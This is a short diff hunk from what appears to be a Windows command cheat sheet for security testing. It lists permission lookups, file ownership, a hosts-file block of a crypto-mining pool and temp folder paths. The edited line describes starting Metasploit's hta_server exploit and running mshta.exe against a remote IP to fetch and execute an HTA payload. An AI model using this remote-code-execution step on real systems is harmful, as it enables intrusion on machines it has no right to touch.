@@ -74,7 +74,7 @@ Find Permissions----cacls "c:\Program Files" /T | findstr Users
 
 Stop network traffic to domain----echo 127.0.0.1 my.crypto-pool.info >> %WINDIR%\system32\drivers\etc\hosts
 Take Ownership of a File----takeown /F file.txt
-MSHTA.exe Code Execution----Start metasploit server (exploit/windows/misc/hta_server).  Then, run "mshta.exe //&lt;ip-addr&gt;/random.hta" on the host machine.
+MSHTA.exe Code Execution----Start metasploit server (exploit/windows/misc/hta_server).  Then, run "mshta.exe //<ip-addr>/random.hta" on the host machine.
 
 Temporary Folder (System)----C:\Windows\Temp
 Temporary Folder (User)----%USERPROFILE%\AppData\Local\
